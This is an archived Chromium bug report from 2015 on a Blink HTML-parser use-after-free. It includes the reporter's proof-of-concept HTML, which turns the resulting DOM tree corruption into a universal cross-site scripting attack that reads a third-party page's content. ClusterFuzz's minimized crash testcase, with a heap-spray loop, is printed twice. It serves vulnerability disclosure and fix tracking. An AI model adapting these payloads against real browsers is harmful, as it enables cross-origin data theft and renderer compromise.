# Heap-use-after-free in blink::ContainerNode::attach

| Field | Value |
|-------|-------|
| **Issue ID** | [40081549](https://issues.chromium.org/issues/40081549) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | se...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2015-03-05 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

The HTML parser calls |parserRemoveChild| and |parserAppendChild| consecutively to perform reparenting  

of a node.  

src/third\_party/WebKit/Source/core/html/parser/HTMLConstructionSite.cpp:149:  

static inline void executeReparentTask(HTMLConstructionSiteTask& task)  

{  

ASSERT(task.operation == HTMLConstructionSiteTask::Reparent);

```
if (ContainerNode\* parent = task.child->parentNode())  
    parent->parserRemoveChild(\*task.child);  

task.parent->parserAppendChild(task.child);  

```

}

|childrenChanged| is called at the end of |parserRemoveChild| and |HTMLScriptElement::childrenChanged|  

may cause execution of user-supplied JavaScript which inserts the child node back into the parent.  

Later |parserAppendChild| won't check if the child node has a parent leaving the DOM tree in a state  

where a node belongs to two different subtrees.

It's also possible to turn the tree corruption into a UXSS using the technique similar to the one  

described in <https://crbug.com/chromium/456518> - an attacker loads the victim page in an iframe, sets the iframe's src to a  

javascript: uri and forces the parser to insert the iframe into document for the second time as a part  

of another subtree.

**VERSION**  

Google Chrome 43.0.2323.0 canary  

Google Chrome 41.0.2272.76  

OS: Windows 7 x64

**REPRODUCTION CASE**

<body>
<script type="foo">
s.appendChild(p)
</script>
<b>
<p>
<script>
p = document.querySelector("p");
s = document.querySelector("script");
s.appendChild(p);
s.type = "";
</script>
</b>
</p>
<script>
frame = document.body.appendChild(document.createElement("iframe"));
frame.contentWindow.location = "https://www.google.com/intl/en/ads/?fg=1";
frame.onload = function() {
frame.onload = null;
frame.src = "javascript:alert(document.body.innerHTML)";
```
		helper = document.body.appendChild(document.createElement("iframe"));  
		helper.srcdoc = "<b><p><script>(" + function() {  
			pp = document.querySelector("p");  
			pp.remove();  
			pp.appendChild(top.s);  
		} + "())</sc" + "ript></b></p>";  
	};  
</script>  

```
</body>

---

I would like to remain anonymous for this report.

## Attachments

- [poc_crash.html](attachments/poc_crash.html) (text/html, 482 B)
- [debug_data.txt](attachments/debug_data.txt) (text/plain, 10.4 KB)
- [poc_uxss.html](attachments/poc_uxss.html) (text/html, 794 B)

## Timeline

### in...@chromium.org (2015-03-05)

[Empty comment from Monorail migration]

### in...@chromium.org (2015-03-05)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-03-05)

ClusterFuzz is analyzing your testcase. Chromium developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=5489358283472896

### cl...@chromium.org (2015-03-05)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5489358283472896

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x60f000011ac8
Crash State:
  blink::ContainerNode::attach
  blink::Element::attach
  blink::ContainerNode::attach
  

Minimized Testcase (0.41 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv961J173OwuBWxOttWod9gg9GBgRJtOqxOfvpQs7fHitnpiZtXXJ0SA2Eez3ZaCcJCzxkXmqmdMAJloQa8x7ZluhiV6mDivV_OVegKCFTmgx7ViyyyfL4NlvzeLiK8dMspSdvzwxLiYLlDDXwdCbtn5Y9_x_pA
<script type="foo">
		s.appendChild(p)
	</script>
	<b>
		<p>
			<script>
			 p = document.querySelector("p");
			 s = document.querySelector("script");
			 s.appendChild(p);
			 s.type = "";
			 </script>
		</b>
	</p>
	<script>
		p.parentNode.innerHTML = "";
		p = null;
		(gc = function() {
			for (var i = 0; i < 30000; ++i)
				var s = new String("AAAA" + Math.random());
		})();
		location.reload();
	</script>





### in...@chromium.org (2015-03-05)

Hajime, this looks crazy bad and exploitable (also look to exist from start of time). Can you please take a look or help with an owner.

### [Deleted User] (2015-03-09)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-03-10)

[Empty comment from Monorail migration]

### [Deleted User] (2015-03-13)

Fixed: https://codereview.chromium.org/1007523003/


### aa...@google.com (2015-03-13)

Thanks!

### cl...@chromium.org (2015-03-13)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### cl...@chromium.org (2015-03-14)

ClusterFuzz has detected this issue as fixed in range 320284:320470.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5489358283472896

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x60f000011ac8
Crash State:
  blink::ContainerNode::attach
  blink::Element::attach
  blink::ContainerNode::attach
  
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=320284:320470

Minimized Testcase (0.41 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv961J173OwuBWxOttWod9gg9GBgRJtOqxOfvpQs7fHitnpiZtXXJ0SA2Eez3ZaCcJCzxkXmqmdMAJloQa8x7ZluhiV6mDivV_OVegKCFTmgx7ViyyyfL4NlvzeLiK8dMspSdvzwxLiYLlDDXwdCbtn5Y9_x_pA
<script type="foo">
		s.appendChild(p)
	</script>
	<b>
		<p>
			<script>
			 p = document.querySelector("p");
			 s = document.querySelector("script");
			 s.appendChild(p);
			 s.type = "";
			 </script>
		</b>
	</p>
	<script>
		p.parentNode.innerHTML = "";
		p = null;
		(gc = function() {
			for (var i = 0; i < 30000; ++i)
				var s = new String("AAAA" + Math.random());
		})();
		location.reload();
	</script>

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.


### ti...@google.com (2015-04-08)

Merge-Requested to M42 - branch 2311 

(noting that this request is after the stable candidate qualification, so may not go out with first M42 unless there's a respin)

### la...@google.com (2015-04-08)

[Automated comment] No bugdroid (commit) comments found, couldn't auto-approve, needs manual review.

### am...@chromium.org (2015-04-08)

merge approved for m42 branch 2311

### ha...@chromium.org (2015-04-09)

[Empty comment from Monorail migration]

### ti...@google.com (2015-04-09)

@haraken - can you please land this change to 2311 when you're next in the office? Thanks.

### ha...@chromium.org (2015-04-09)

I think I merged the CL into 2311 in r193433.


### in...@chromium.org (2015-04-20)

[Empty comment from Monorail migration]

### ti...@google.com (2015-05-12)

[Empty comment from Monorail migration]

### ti...@google.com (2015-05-16)

[Empty comment from Monorail migration]

### ti...@google.com (2015-05-28)

Hey Serg, $7500 for this report. Congrats!

Reward panel notes: "Full renderer exploit - we'll mention in M43 release notes"

### cl...@chromium.org (2015-06-19)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2015-06-25)

[Empty comment from Monorail migration]

### ti...@google.com (2015-07-24)

Processing via our e-payment system can take up to two weeks, but the reward should be on its way to you. Thanks again for your help!

(Note: sorry for the delay here - it turns out in the new payment system, these payments were waiting for a second approval from me).

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### aw...@google.com (2019-02-16)

[Empty comment from Monorail migration]

### is...@google.com (2019-02-16)

This issue was migrated from crbug.com/chromium/464552?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40081549)*
